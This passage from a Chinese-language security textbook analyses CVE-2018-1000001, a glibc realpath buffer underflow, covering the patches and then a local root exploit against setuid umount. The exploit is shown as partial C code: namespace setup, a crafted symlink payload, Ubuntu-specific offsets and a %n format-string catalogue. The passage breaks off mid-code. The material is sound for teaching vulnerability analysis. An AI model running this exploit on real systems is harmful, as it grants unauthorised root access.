[...]
/* Find end of path component. */
for (end = start; *end && *end != '/'; ++end) // end 标记一
段路径的末尾
/* Nothing. */;
if (end - start == 0)
break;
else if (end - start == 1 && start[0] == '.') // 当路径为 "
." 的情况时
/* nothing */;
else if (end - start == 2 && start[0] == '.' && start[1] =
= '.') // 当路径为 ".." 的情况时
{
/* Back up to previous component, ignore if at root alread
y. */
if (dest > rpath + 1)
while ((--dest)[-1] != '/'); // 回溯，如果 rpath 中没有
'/'，发生下溢出
}
else // 路径组成中没有 "." 和 ".." 的情况时，复制 name 到 dest
{
1574
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
size_t new_size;
if (dest[-1] != '/')
*dest++ = '/';
[...]
}
}
}
当传入的 name 不是一个绝对路径，比如 ../../x ， realpath() 将会使用当
前工作目录来进行解析，而且默认了它以 / 开头。解析过程是从后先前进行的，
当遇到 ../ 的时候，就会跳到前一个 / ，但这里存在一个问题，没有对缓冲区
边界进行检查，如果缓冲区不是以 / 开头，则函数会越过缓冲区，发生溢出。所
以当 getcwd 返回的是一个不可到达路径 (unreachable)/ 时， ../../x 的
第二个 ../ 就已经越过了缓冲区，然后 x 会被复制到这个越界的地址处。
补丁
漏洞发现者也给出了它自己的补丁，在发生溢出的地方加了一个判断，当 dest
== rpath 的时候，如果 *dest != '/' ，则说明该路径不是以 / 开头，便触
发报错。
--- stdlib/canonicalize.c 2018-01-05 07:28:38.000000000 +0000
+++ stdlib/canonicalize.c 2018-01-05 14:06:22.000000000 +0000
@@ -91,6 +91,11 @@
goto error;
}
dest = __rawmemchr (rpath, '\0');
+/* If path is empty, kernel failed in some ugly way. Realpath
+has no error code for that, so die here. Otherwise search later
+on would cause an underrun when getcwd() returns an empty strin
g.
+Thanks Willy Tarreau for pointing that out. */
+ assert (dest != rpath);
}
else
{
@@ -118,8 +123,17 @@
1575
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
else if (end - start == 2 && start[0] == '.' && start[1]
== '.')
{
/* Back up to previous component, ignore if at root alrea
dy. */
- if (dest > rpath + 1)
- while ((--dest)[-1] != '/');
+ dest--;
+ while ((dest != rpath) && (*--dest != '/'));
+ if ((dest == rpath) && (*dest != '/') {
+ /* Return EACCES to stay compliant to current documenta
tion:
+ "Read or search permission was denied for a component o
f the
+ path prefix." Unreachable root directories should not be
+ accessed, see https://www.halfdog.net/Security/2017/Lib
cRealpathBufferUnderflow/ */
+ __set_errno (EACCES);
+ goto error;
+ }
+ dest++;
}
else
{
但这种方案似乎并没有被合并。
最终采用的方案是直接从源头来解决，对 getcwd() 返回的路径 path 进行检
查，如果确定 path[0] == '/' ，说明是绝对路径，返回。否则转到
generic_getcwd() （内部函数，源码里看不到）进行处理：
1576
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
$ git show 52a713fdd0a30e1bd79818e2e3c4ab44ddca1a94 sysdeps/unix
/sysv/linux/getcwd.c | cat
diff --git a/sysdeps/unix/sysv/linux/getcwd.c b/sysdeps/unix/sys
v/linux/getcwd.c
index f545106289..866b9d26d5 100644
--- a/sysdeps/unix/sysv/linux/getcwd.c
+++ b/sysdeps/unix/sysv/linux/getcwd.c
@@ -76,7 +76,7 @@ __getcwd (char *buf, size_t size)
int retval;
retval = INLINE_SYSCALL (getcwd, 2, path, alloc_size);
- if (retval >= 0)
+ if (retval > 0 && path[0] == '/')
{
#ifndef NO_ALLOCATION
if (buf == NULL && size == 0)
@@ -92,10 +92,10 @@ __getcwd (char *buf, size_t size)
return buf;
}
- /* The system call cannot handle paths longer than a page.
- Neither can the magic symlink in /proc/self. Just use the
+ /* The system call either cannot handle paths longer than a p
age
+ or can succeed without returning an absolute path. Just u
se the
generic implementation right away. */
- if (errno == ENAMETOOLONG)
+ if (retval >= 0 || errno == ENAMETOOLONG)
{
#ifndef NO_ALLOCATION
if (buf == NULL && size == 0)
Exploit
umount 包含在 util-linux 中，为方便调试，我们重新编译安装一下：
1577
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
$ sudo apt-get install dpkg-dev automake
$ sudo apt-get source util-linux
$ cd util-linux-2.27.1
$ ./configure
$ make && sudo make install
$ file /bin/umount
/bin/umount: setuid ELF 64-bit LSB executable, x86-64, version 1
(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.
so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2104fb4e2c126b9ac812e6
11b291e034b3c361f2, not stripped
exp 主要分成两个部分：
1578
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
int main(int argc, char **argv) {
[...]
pid_t nsPid=prepareNamespacedProcess();
while(excalateCurrentAttempt<escalateMaxAttempts) {
[...]
attemptEscalation();
[...]
if(statBuf.st_uid==0) {
fprintf(stderr, "Executable now root-owned\n");
goto escalateOk;
}
}
preReturnCleanup:
[...]
if(!exitStatus) {
fprintf(stderr, "Cleanup completed, re-invoking binary\n");
invokeShell("/proc/self/exe");
exitStatus=1;
}
escalateOk:
exitStatus=0;
goto preReturnCleanup;
}
prepareNamespacedProcess() ：准备一个运行在自己 mount namespace
的进程，并设置好适当的挂载结构。该进程允许程序在结束时可以清除它，从
而删除 namespace。
attemptEscalation() ：调用 umount 来获得 root 权限。
简单地说一下 mount namespace，它用于隔离文件系统的挂载点，使得不同的
mount namespace 拥有自己独立的不会互相影响的挂载点信息，当前进程所在的
mount namespace 里的所有挂载信息在
/proc/[pid]/mounts 、 /proc/[pid]/mountinfo 和
/proc/[pid]/mountstats 里面。每个 mount namespace 都拥有一份自己的挂
1579
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
载点列表，当用 clone 或者 unshare 函数创建了新的 mount namespace 时，新创
建的 namespace 会复制走一份原来 namespace 里的挂载点列表，但从这之后，
两个 namespace 就没有关系了。
首先为了提权，我们需要一个 SUID 程序，mount 和 umount 是比较好的选择，因
为它们都依赖于 realpath() 来解析路径，而且能被所有用户使用。其中
umount 又最理想，因为它一次运行可以操作多个挂载点，从而可以多次触发到漏
洞代码。
由于 umount 的 realpath() 的操作发生在堆上，第一步就得考虑怎样去创造一
个可重现的堆布局。通过移除可能造成干扰的环境变量，仅保留 locale 即可做到这
一点。locale 在 glibc 或者其它需要本地化的程序和库中被用来解析文本（如时
间、日期等），它会在 umount 参数解析之前进行初始化，所以会影响到堆的结构
和位于 realpath() 函数缓冲区前面的那些低地址的内容。漏洞的利用依赖于单
个 locale 的可用性，在标准系统中，libc 提供了一个 /usr/lib/locale/C.UTF-
8 ，它通过环境变量 LC_ALL=C.UTF-8 进行加载。
在 locale 被设置后，缓冲区下溢将覆盖 locale 中用于加载 national language
support(NLS) 的字符串中的一个 / ，进而将其更改为相对路径。然后，用户控制
的 umount 错误信息的翻译将被加载，使用 fprintf() 函数的 %n 格式化字符串，即
可对一些内存地址进行写操作。由于 fprintf() 所使用的堆栈布局是固定的，所以可
以忽略 ASLR 的影响。于是我们就可以利用该特性覆盖掉 libmnt_context 结构
体中的 restricted 字段：
// util-linux/libmount/src/mountP.h
struct libmnt_context
{
int action; /* MNT_ACT_{MOUNT,UMOUNT} */
int restricted; /* root or not? */
char *fstype_pattern; /* for mnt_match_fstype() */
char *optstr_pattern; /* for mnt_match_options() */
[...]
};
1580
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
在安装文件系统时，挂载点目录的原始内容会被隐藏起来并且不可用，直到被卸
载。但是，挂载点目录的所有者和权限没有被隐藏，其中 restricted 标志用于
限制堆挂载文件系统的访问。如果我们将该值覆盖，umount 会误以为挂载是从
root 开始的。于是可以通过卸载 root 文件系统做到一个简单的 DoS（如参考文章
中所示，可以在Debian下尝试）。
当然我们使用的 Ubuntu16.04 也是在漏洞利用支持范围内的：
static char* osSpecificExploitDataList[]={
// Ubuntu Xenial libc=2.23-0ubuntu9
"\"16.04.3 LTS (Xenial Xerus)\"",
"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/
A",
"_nl_load_locale_from_archive",
"\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\
x00"
};
prepareNamespacedProcess() 函数如下所示：
static int usernsChildFunction() {
[...]
int result=mount("tmpfs", "/tmp", "tmpfs", MS_MGC_VAL, NULL);
// 将 tmpfs 类型的文件系统 tmpfs 挂载到 /tmp
[...]
}
pid_t prepareNamespacedProcess() {
if(namespacedProcessPid==-1) {
[...]
namespacedProcessPid=clone(usernsChildFunction, stackData+(1
<<20),
CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL); // 调用 clon
e() 创建进程，新进程执行函数 usernsChildFunction()
[...]
char pathBuffer[PATH_MAX];
int result=snprintf(pathBuffer, sizeof(pathBuffer), "/proc/%d/
cwd",
1581
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
namespacedProcessPid);
char *namespaceMountBaseDir=strdup(pathBuffer); // /proc/[p
id]/cwd 是一个符号连接, 指向进程当前的工作目录
// Create directories needed for umount to proceed to final state
// "not mounted".
createDirectoryRecursive(namespaceMountBaseDir, "(unreachable)
/x"); // 在 cwd 目录下递归创建 (unreachable)/x。下同
result=snprintf(pathBuffer, sizeof(pathBuffer),
"(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES", osReleaseExplo
itData[2]);
createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
result=snprintf(pathBuffer, sizeof(pathBuffer),
"(unreachable)/tmp/%s/X.X/LC_MESSAGES", osReleaseExploitDa
ta[2]);
createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
result=snprintf(pathBuffer, sizeof(pathBuffer),
"(unreachable)/tmp/%s/X.x/LC_MESSAGES", osReleaseExploitDa
ta[2]);
createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
// Create symlink to trigger underflows.
result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/(unreachab
le)/tmp/down",
namespaceMountBaseDir);
result=symlink(osReleaseExploitData[1], pathBuffer); // 创建
名为 pathBuffer 的符号链接
[...]
// Write the initial message catalogue to trigger stack dumping
// and to make the "umount" call privileged by toggling the "res
tricted"
// flag in the context.
result=snprintf(pathBuffer, sizeof(pathBuffer),
"%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo"
,
namespaceMountBaseDir, osReleaseExploitData[2]); // 覆盖
"restricted" 标志将赋予 umount 访问已装载文件系统的权限
1582
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
[...]
char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/
8));
char *stackDumpStrEnd=stackDumpStr;
stackDumpStrEnd+=sprintf(stackDumpStrEnd, "AA%%%d$lnAAAAAA",
((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);
for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCo
unt--) { // 通过格式化字符串 dump 栈数据，以对抗 ASLR
memcpy(stackDumpStrEnd, "%016lx", 6);
stackDumpStrEnd+=6;
}
[...]
result=writeMessageCatalogue(pathBuffer,
(char*[]){
"%s: mountpoint not found",
"%s: not mounted",
"%s: target is busy\n (In some cases useful inf
o about processes that\n use the device is found by lsof
(8) or fuser(1).)"